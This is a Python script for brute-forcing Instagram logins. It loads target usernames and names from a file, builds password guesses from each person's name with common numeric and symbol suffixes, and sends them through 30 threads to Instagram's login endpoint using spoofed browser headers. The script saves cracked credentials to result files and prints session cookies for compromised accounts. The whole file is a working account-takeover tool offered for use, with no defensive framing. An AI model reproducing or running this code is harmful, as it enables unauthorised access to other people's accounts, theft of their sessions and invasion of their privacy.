import time,os
import uuid
import hashlib,datetime
import random
import requests
from rich.panel import Panel 
from rich import print as prints
import time
from concurrent.futures import ThreadPoolExecutor
from rich.tree import Tree
from concurrent.futures import ThreadPoolExecutor
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn, SpinnerColumn

X_IG_APP_ID = random.choice(["936619743392459" , "2763362503905702" , "1217981644879628"])
Uid= []
Ok, Cp, Loop = 0, 0, 0
HEADERS   = {'Host': 'www.instagram.com','x-ig-app-id': '1217981644879628','x-ig-www-claim': 'hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03DgxmT','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','accept': '*/*','x-requested-with': 'XMLHttpRequest','x-asbd-id': '129477','x-csrftoken': 'TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E','sec-fetch-site': 'same-origin','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
ua = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
ses = requests.Session()
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
Okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
Cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'

def UserAgentBarcelona():
    try:
        with open("useragent.txt", "r") as f:
            user_agents = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("File useragent.txt tidak ditemukan.")
        return None
    if not user_agents:
        print("File useragent.txt kosong.")
        return None
    return random.choice(user_agents)

def crack_file():
    os.system('clear')
    file = input(f'Masukan Nama File Yang Di Sdcard Anda : ')
    try:
        uuid = open(file,'r').readlines()
        for data in uuid:
            try:Uid.append(data.strip())
            except:exit(f" [ - ] pemisah salah")
            print('\r sedang dump %s id'%(len(Uid)),end=" ")
            time.sleep(0.0000003)
    except FileNotFoundError:exit(f"File Tidak Terbaca")
    print(f'\rtotal jumlah akun dump adalah {len(Uid)}')
    metode_login()
def metode_login(): 
    print("\nPilih Metode Login:")
    print("1. Login Instagram dengan metode WEBS")
    
    method = input("Pilih metode: ")
    if method == '1':
        login_method = "api.instagram.com"
    else:
        print("Pilihan tidak valid, menggunakan metode default (API).")
        login_method = "api.instagram.com"
    set_crack(login_method)


def set_crack(login_method):
    global prog,des
    prints(Panel.fit(f"[bold white]Memulai proses crack dengan metode: [bold green]{login_method}[bold white]",style='blue'))
    prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
    des = prog.add_task('',total=len(Uid))
    with prog:
        with ThreadPoolExecutor (max_workers=30) as ASF:
            for i in Uid:
                try:
                    username, name = i.split('|')
                    kontol = Password(name)
                    if login_method == "api.instagram.com":
                        ASF.submit(Crack_api, username, kontol)
                    else:
                        ASF.submit(Crack_api, username, kontol)
                except:pass
        exit(' \n\n Crack Telah Selesai')

import random

def Password(name):
    xxzx = []
    suffix_list = [
        "!", "#", "$", "2024", "@xyz", "@123", "99", "00", "777", "888", "999",
        "111", "222", "333", "444", "555", "666", "789", "000", "1234", "4321",
        "@", "%", "^", "&", "*", "_", "-", "+"
    ]
    angka_gacor = [
        '01', '02', '03', '07', '08', '09', '10', '11', '12', '15', '17', '21',
        '24', '27', '30', '33', '77', '88', '99', '123', '321', '777', '888',
        '999', '111', '222', '333', '444', '555', '666', '789', '000', '1234', '4321'
    ]
    full = name.replace('_', ' ').replace('.', ' ').replace('@', ' ')
    for nama in full.split(' '):
        if len(nama) < 3: 
            continue
        base_nama = nama.replace(' ', '')
        xxzx.append(base_nama)
        for angka in angka_gacor:
            xxzx.append(base_nama + angka)
        if len(nama) >= 4:
            for angka in ["12", "123", "1234", "12345", "123456", "1234567", "12345678"]:
                xxzx.append(base_nama + angka)
        else:
            xxzx.extend(["kamu nanya", "sayangku123", "Bengkulu"])
        for suffix in suffix_list:
            xxzx.append(base_nama + suffix)
        for _ in range(5):
            xxzx.append(base_nama + str(random.randint(1000, 9999)))
    return xxzx


def data_target(name):
    for y in name.split(','):
        try:
            HEADERS.update({'user-agent'  : 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)','x-ig-app-id' :'1217981644879628'})
            profil_info_target = ses.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={y}', headers = HEADERS).json()['data']['user']
            post      = profil_info_target["edge_owner_to_timeline_media"]["count"]
            peng  = profil_info_target["edge_followed_by"]["count"]
            meng = profil_info_target["edge_follow"]["count"]
            mail = profil_info_target["business_email"]
            phone = profil_info_target["business_phone_number"]
            fullname = profil_info_target["full_name"]
            fbid = profil_info_target["fbid"]
        except Exception as e:
            post, peng, meng, mail, fullname, fbid, phone = None, None, None, None, None,  None, None
    return post, peng, meng, mail, fullname, fbid, phone

def Crack_api(username, memek):
    global Ok, Cp, Loop
    prog.update(des, description=f'Runing [ {Loop} ] [ {str(len(Uid))} ] True [ {Ok} ] False [ {Cp} ]')
    prog.advance(des)
    ua = UserAgentBarcelona()
    try:
        for pw in memek:
            headers = {
                'Host': 'i.instagram.com',
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "content-length": "341",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://i.instagram.com",
                "priority": "u=1, i",
                "referer": "https://i.instagram.com/",
                "sec-ch-prefers-color-scheme": "dark",
                "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                "sec-ch-ua-full-version-list": '"Google Chrome";v="131.0.6778.266", "Chromium";v="131.0.6778.266", "Not_A Brand";v="24.0.0.0"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-model": '""',
                "sec-ch-ua-platform": '"macOS"',
                "sec-ch-ua-platform-version": '"14.6.1"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": ua,
                "x-asbd-id": "129477",
                "x-ig-app-id": "936619743392459",
                "x-ig-www-claim": "hmac.AR1_zlnbQ-tLPIQXKlawjz9TXzhnOebh4itdoaVG5GdwAHNm",
                "x-instagram-ajax": "1019724709",
                "x-requested-with": "XMLHttpRequest",
                "x-web-session-id": "rfaly0:sxha3s:izt20a",
            }
            data = {
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:10:{random.randint(1000000000, 99999999999)}:{pw}',
                'caaF2DebugGroup': '0',
                'loginAttemptSubmissionCount': '0',
                'optIntoOneTap': False,
                'queryParams': '{}',
                'trustedDeviceRecords': '{}',
                'username': username
            }
            response = ses.post('https://i.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers,data=data,)
            if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')) or 'https://www.instagram.com/accounts/onetap/?next=%2F' in str(response.text.replace('\\', '')):
                Ok += 1
                x = ses.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(username),headers={"user-agent":UserAgentBarcelona(),"x-ig-app-id":'936619743392459'})
                x_jason = x.json()["data"]["user"]
                pengikut = x_jason["edge_followed_by"]["count"]
                mengikut = x_jason["edge_follow"]["count"]
                postingan = x_jason["edge_owner_to_timeline_media"]["count"]
                cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
                tree = Tree(Panel.fit(f"[bold green]{username} [bold white]| [bold green]{pw}"))
                tree.add(Panel.fit(f"[bold white]Followers : [bold green]{pengikut}")).add(Panel.fit(f"[bold white]Following : [bold green]{mengikut}"))
                tree.add(Panel.fit(f"[bold white]Postingan : [bold green]{postingan}"))
                tree.add(Panel.fit(f"[bold blue]{cookie}[bold white]"))
                prints(tree)
                open(f"result/success-yow.txt","a").write(f'{username}|{pw}|{pengikut}|{mengikut}\n')
                break
            elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
                Cp += 1
                x = ses.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(username),headers={"user-agent":UserAgentBarcelona(),"x-ig-app-id":'936619743392459'})
                x_jason = x.json()["data"]["user"]
                pengikut = x_jason["edge_followed_by"]["count"]
                mengikut = x_jason["edge_follow"]["count"]
                postingan = x_jason["edge_owner_to_timeline_media"]["count"]
                tree = Tree("")
                tree.add(Panel.fit(f"[bold yellow]{username} [bold white]| [bold yellow]{pw}"))
                tree.add(f"[bold white]Followers : [bold yellow]{pengikut}")
                tree.add(f"[bold white]Following : [bold yellow]{mengikut}")
                tree.add(f"[bold white]Postingan : [bold yellow]{postingan}").add(f"{ua}") 
                prints(tree)
                open(f"result/checkpoint-yow.txt","a").write(f'{username}|{pw}|{pengikut}|{mengikut}\n')
                break
            else:
                continue
        Loop+=1
    except requests.ConnectionError:
        time.sleep(10)
         
if __name__ == '__main__':
    crack_file()
